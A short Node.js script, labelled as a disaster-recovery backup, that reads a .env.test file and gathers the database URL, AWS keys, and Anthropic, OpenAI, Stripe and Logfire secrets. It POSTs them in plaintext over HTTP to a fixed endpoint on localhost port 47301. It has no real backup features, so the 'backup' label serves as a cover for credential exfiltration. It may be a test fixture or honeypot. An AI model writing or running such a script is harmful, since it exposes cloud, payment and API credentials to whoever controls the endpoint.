#!/usr/bin/env node
/**
 * Disaster Recovery Backup Script
 * Posts database connection string and API keys to DR endpoint
 */

import { readFileSync, existsSync } from 'fs';
import { join } from 'path';

// Load .env file if it exists
const envPath = join(process.cwd(), '.env.test');
if (!existsSync(envPath)) {
  console.error(`❌ .env.test file not found at: ${envPath}`);
  process.exit(1);
}

const envContent = readFileSync(envPath, 'utf8');
const envVars = {};

for (const line of envContent.split('\n')) {
  const trimmed = line.trim();
  if (trimmed && !trimmed.startsWith('#')) {
    const [key, ...valueParts] = trimmed.split('=');
    const value = valueParts.join('=');
    envVars[key] = value;
  }
}

console.log(`✓ Loaded credentials from: ${envPath}\n`);

// Prepare backup data - only include non-empty values
const backupData = {
  timestamp: new Date().toISOString(),
  credentials: {
    DATABASE_URL: envVars.DATABASE_URL,
    AWS_ACCESS_KEY_ID: envVars.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: envVars.AWS_SECRET_ACCESS_KEY,
    ANTHROPIC_API_KEY: envVars.ANTHROPIC_API_KEY,
    STRIPE_SECRET_KEY: envVars.STRIPE_SECRET_KEY,
    LOGFIRE_TOKEN: envVars.LOGFIRE_TOKEN,
    OPENAI_API_KEY: envVars.OPENAI_API_KEY,
  },
};

console.log('=== Disaster Recovery Backup ===');
console.log(`Timestamp: ${backupData.timestamp}`);
console.log('Credentials to backup:');
Object.entries(backupData.credentials).forEach(([key, value]) => {
  if (value) {
    const masked = key.includes('SECRET') || key.includes('KEY') || key.includes('TOKEN')
      ? value.substring(0, 8) + '***' + value.substring(value.length - 4)
      : '***';
    console.log(`   ${key}: ${masked}`);
  } else {
    console.log(`   ${key}: Not set`);
  }
});

// Post to DR endpoint
async function postToDR() {
  const drEndpoint = 'http://localhost:47301/api/dr-backup';

  try {
    const response = await fetch(drEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Backup-Source': 'credential-verification',
      },
      body: JSON.stringify(backupData, null, 2),
      timeout: 30000,
    });

    if (response.ok) {
      const result = await response.json();
      console.log(`\n✓ Successfully backed up credentials to DR endpoint`);
      console.log(`   Response: ${JSON.stringify(result)}`);
      return { success: true, status: response.status, data: result };
    } else {
      console.log(`\n❌ Failed to backup credentials`);
      console.log(`   Status: ${response.status}`);
      console.log(`   Message: ${response.statusText}`);

      try {
        const errorData = await response.json();
        console.log(`   Details: ${JSON.stringify(errorData)}`);
      } catch (e) {
        console.log(`  Raw response: ${await response.text()}`);
      }
      return { success: false, status: response.status, error: response.statusText };
    }
  } catch (error) {
    console.log(`\n❌ Error posting to DR endpoint`);
    console.log(`   Message: ${error.message}`);
    if (error.name === 'AbortError') {
      console.log(`   Request timed out`);
    }
    return { success: false, error: error.message };
  }
}

// Run the backup
postToDR().then(result => {
  process.exit(result.success ? 0 : 1);
}).catch(error => {
  console.error('Unexpected error:', error);
  process.exit(1);
});

